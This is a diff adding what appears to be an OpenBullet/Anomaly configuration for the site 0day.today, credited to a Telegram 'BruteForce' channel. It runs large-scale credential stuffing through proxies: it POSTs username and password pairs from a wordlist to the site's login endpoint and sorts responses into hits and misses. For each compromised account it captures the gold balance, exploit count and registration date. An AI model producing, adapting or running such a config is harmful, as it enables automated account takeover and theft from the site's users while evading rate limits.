@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "0day.today",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-06T23:01:33.8690623+02:00",
+  "AdditionalInfo": "T.me/BruteForce",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST POST "https://en.0day.today/" 
+  CONTENT "agree=Yes%2C+I+agree" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://en.0day.today" 
+  HEADER "referer: https://en.0day.today/" 
+
+#POST REQUEST POST "https://en.0day.today/auth/check" 
+  CONTENT "login=<USER>&pass=<PASS>&auth=&auth=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://en.0day.today/auth" 
+  HEADER "origin: https://en.0day.today" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Reg date" 
+  KEYCHAIN Retry OR 
+    KEY "Do you agree to these terms" 
+
+#GGG PARSE "<SOURCE>" LR "href='/add' class=''>add exploit</a> ]" "style='text-decoration:;'>withdraw</a>" -> VAR "GGG" 
+
+#GOLD PARSE "<GGG>" LR "href='/gold' class='YellowTextGold'>" "</a>" CreateEmpty=FALSE -> CAP "GOLD" 
+
+#EXP PARSE "<SOURCE>" LR "<div class='td'>Exploits</div>" "</div>" -> VAR "EXP" 
+
+#Exploits PARSE "<EXP>" LR "<div class='td'>" "" CreateEmpty=FALSE -> CAP "Exploits" 
+
+#XXX PARSE "<SOURCE>" LR "<div class='td'>BL</div>" "</div>" -> VAR "XXX" 
+
+#BL PARSE "<XXX>" LR "class='td'>" "" -> CAP "BL" 
+
+#RRR PARSE "<SOURCE>" LR "<div class='td'>Reg date</div>" "</div>" -> VAR "RRR" 
+
+#Reg_Date PARSE "<RRR>" LR "<div class='td'>" "" CreateEmpty=FALSE -> CAP "Reg Date" 
+
